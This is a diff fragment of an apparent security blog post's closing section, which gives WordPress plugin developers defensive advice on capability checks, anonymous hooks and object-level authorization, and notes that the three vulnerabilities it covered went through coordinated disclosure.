+</section><section id="if-you-ship-a-plugin"><h2><span class="hn">08</span>If you ship a plugin</h2>
+<p>Four things, in descending order of how much grief they save you:</p>
 <ul class="bullets">
-<li><strong>Every <code>permission_callback</code> gets a real capability check against a real object.</strong> If you wrote <code>__return_true</code>, you shipped a public endpoint; make sure you meant to.</li>
-<li><strong>Audit every <code>_nopriv_</code> hook you have.</strong> For each one, write down in a comment why an anonymous caller is acceptable. If you cannot finish the sentence, delete the hook.</li>
-<li><strong>Treat nonces and capabilities as unrelated.</strong> They defend against different attacks. You need both, and having one tells you nothing about the other.</li>
-<li><strong>Check the object, not just the verb.</strong> <code>current_user_can('edit_posts')</code> is a role test. <code>current_user_can('edit_post', $id)</code> is an authorisation decision. The second argument is where IDOR goes to die.</li>
+<li><strong>Every <code>permission_callback</code> gets a real capability check against a real object.</strong> If you wrote <code>__return_true</code>, you shipped a public endpoint. Make sure you meant to.</li>
+<li><strong>Never make an authorization decision on a raw string match against the URL.</strong> CheckView's filter and WordPress's router were reading different things out of the same request. If you must special-case your own routes, resolve the route first and compare that.</li>
+<li><strong>Audit every <code>_nopriv_</code> hook.</strong> For each, write a comment explaining why an anonymous caller is acceptable. If you cannot finish the sentence, delete the hook.</li>
+<li><strong>Check the object, not just the verb.</strong> <code>current_user_can('edit_posts')</code> is a role test. <code>current_user_can('edit_post', $id)</code> is an authorization decision. The second argument is where IDOR goes to die.</li>
 </ul>
-<p>Fifty-one vulnerabilities, 46 plugins, one missing line. The WordPress plugin ecosystem is not insecure because it is hard to secure. It is insecure because the API makes the unsafe thing shorter to type.</p>
+<p>And one for the people who buy plugins rather than write them: the number of installations tells you about popularity, not about review. Three of the plugins in my corpus had six figures of active installs.</p>
+<p>Fifty-one vulnerabilities, 46 plugins, one missing line. The WordPress plugin ecosystem is not insecure because security is hard here. It is insecure because the unsafe thing is shorter to type.</p>
+<p class="codelabel">All three vulnerabilities above were reported through WPScan under coordinated disclosure, fixed by their vendors, and published with CVE IDs before this was written. The full log is on the <a href="/research/">research page</a>.</p>
 </section></article>
-        <aside class="wu-rail"><h2>On this page</h2><ol><li><a href="#the-corpus">The corpus</a></li><li><a href="#what-the-numbers-say">What the numbers say</a></li><li><a href="#one-mistake-three-costumes">One mistake, three costumes</a></li><li><a href="#finding-them">Finding them</a></li><li><a href="#if-you-ship-a-plugin">If you ship a plugin</a></li></ol></aside>
+        <aside class="wu-rail"><h2>On this page</h2><ol><li><a href="#where-this-started">Where this started</a></li><li><a href="#case-one-checkview-an-administrator-account-from-a-marker-string">Case one: CheckView, an administrator account from a marker string</a></li><li><a href="#case-two-ezoic-a-full-database-export-in-three-requests">Case two: Ezoic, a full database export in three requests</a></li><li><a href="#case-three-wp-travel-engine-other-people-s-bookings">Case three: WP Travel Engine, other people&#x27;s bookings</a></li><li><a href="#the-corpus-behind-the-three">The corpus behind the three</a></li><li><a href="#the-same-bug-in-three-costumes">The same bug in three costumes</a></li><li><a href="#how-i-actually-find-these">How I actually find these</a></li><li><a href="#if-you-ship-a-plugin">If you ship a plugin</a></li></ol></aside>
       </div>
     </div>
   </section>
